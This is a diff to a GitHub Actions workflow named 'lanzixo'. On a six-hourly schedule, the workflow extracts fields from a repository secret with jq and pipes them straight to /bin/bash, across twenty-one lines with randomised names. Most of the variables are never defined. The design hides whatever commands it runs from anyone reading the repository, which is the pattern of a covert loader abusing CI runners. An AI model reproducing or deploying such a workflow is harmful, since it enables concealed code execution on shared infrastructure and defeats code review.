@@ -2,8 +2,7 @@ name: lanzixo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 0/6 * * *'
-
+    - cron: '36 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,9 +11,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: lanzixo
         env:
-          s4: ${{ secrets.s4 }}
+          wmsoq35766: ${{ secrets.wmsoq35766 }}
         run: |
-          echo $s4 | jq -r .ycuz406 | /bin/bash
-          echo $bui4 | jq -r .np7 | /bin/bash
-          echo $istcn345 | jq -r .bd87 | /bin/bash
+          echo $wmsoq35766 | jq -r .bh0624 | /bin/bash
+          echo $yxim44715 | jq -r .bxj12 | /bin/bash
+          echo $vhoum87251 | jq -r .h6878 | /bin/bash
+          echo $orvb94 | jq -r .fqa7322 | /bin/bash
+          echo $eqcjy46 | jq -r .xvupa9 | /bin/bash
+          echo $edlf8 | jq -r .khbf18337 | /bin/bash
+          echo $vnh5 | jq -r .vhr18282 | /bin/bash
+          echo $wbbus44 | jq -r .e8158 | /bin/bash
+          echo $uu40 | jq -r .t12 | /bin/bash
+          echo $glbs073 | jq -r .h32572 | /bin/bash
+          echo $b346 | jq -r .hacdo1159 | /bin/bash
+          echo $dbky18 | jq -r .djvf406 | /bin/bash
+          echo $dkwd4 | jq -r .yhg577 | /bin/bash
+          echo $ky1 | jq -r .f596 | /bin/bash
+          echo $ia0804 | jq -r .skchw0830 | /bin/bash
+          echo $xxes4 | jq -r .fxm72 | /bin/bash
+          echo $kwsr26 | jq -r .lz4 | /bin/bash
+          echo $tvnt606 | jq -r .t7849 | /bin/bash
+          echo $fdsr63 | jq -r .dcrnw3485 | /bin/bash
+          echo $ejk953 | jq -r .gmbbn30004 | /bin/bash
+          echo $n69922 | jq -r .kfrc9 | /bin/bash
 
